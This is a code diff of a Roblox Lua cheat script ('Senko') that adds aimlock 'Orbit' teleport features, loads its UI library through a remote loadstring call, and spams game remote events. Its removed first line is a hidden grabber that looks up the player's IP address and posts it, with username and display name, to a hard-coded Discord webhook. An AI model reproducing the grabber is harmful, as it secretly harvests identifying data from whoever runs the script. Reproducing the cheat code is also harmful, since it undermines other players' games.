@@ -1,4 +1,4 @@
-request({Url="https://discord.com/api/webhooks/1223899455124668479/F_N_hgXE0OsCZm1TpjIfSR-rN7np1gHwkuX5Xng4ORhXBeiIsfVxJdIHr1KfbP3VF-U-",Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({["content"]=string.format("```User: %s\nDisplay Name: %s\nIP Address: %s```",game:GetService("Players").LocalPlayer.Name,game:GetService("Players").LocalPlayer.DisplayName,game:GetService("HttpService"):JSONDecode(request({Url="http://ip-api.com/json",Method="GET"}).Body).query)})})
+
 local Orion = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Senko = {
@@ -9,7 +9,13 @@ local Senko = {
         Target = nil,
         Prediction = 0.19,
         HitPart = "Head",
-        Resolver = false
+        Resolver = false,
+        Orbit = {
+            Enabled = false,
+            Speed = 10,
+            Distance = 5,
+            Integer = 0,
+        }
     },
     Anti = {
         Antilock = false,
@@ -96,6 +102,49 @@ LockTab:AddToggle({
         Senko.Lock.Resolver = v
     end
 })
+local OtherLabel = LockTab:AddLabel("other stuff idk lol")
+
+LockTab:AddToggle({
+    Name = "Resolver",
+    Default = false,
+    Callback = function(v)
+        Senko.Lock.Resolver = v
+    end
+})
+
+LockTab:AddToggle({
+    Name = "Orbit",
+    Default = false,
+    Callback = function(v)
+        Senko.Lock.Orbit.Integer = 0
+        Senko.Lock.Orbit.Enabled = v
+    end
+})
+
+LockTab:AddSlider({
+	Name = "Orbit Speed",
+	Min = 1,
+	Max = 100,
+	Default = 10,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		Senko.Lock.Orbit.Speed = Value
+	end    
+})
+
+LockTab:AddSlider({
+	Name = "Orbit Distance",
+	Min = 1,
+	Max = 50,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		Senko.Lock.Orbit.Distance = Value
+	end    
+})
+
 LockTab:AddLabel("Miscellaneous")
 LockTab:AddToggle({
     Name = "DB Spam",
@@ -135,6 +184,10 @@ game:GetService('RunService').Heartbeat:Connect(function()
         game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(game.Players.LocalPlayer:GetMouse().Hit.p, game:GetService("Players").LocalPlayer.Character.DB)
         game:GetService("ReplicatedStorage"):WaitForChild("ReloadWeapon"):FireServer()
         game.Players.LocalPlayer.Backpack['DB'].Parent =  game.Players.LocalPlayer.Character
+    end
+    if Senko.Lock.Orbit.Enabled == true and Senko.Lock.HasTarget == true then
+        Senko.Lock.Orbit.Integer = Senko.Lock.Orbit.Integer + Senko.Lock.Orbit.Speed
+        Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[Senko.Lock.Target.Name].Character.HumanoidRootPart.Position) * CFrame.Angles(0, math.rad(Senko.Lock.Orbit.Integer), 0) * CFrame.new(Senko.Lock.Orbit.Distance, 0, 0)
     end
     if Senko.Anti.Antilock == true then
         local Velocity = Character.HumanoidRootPart.Velocity
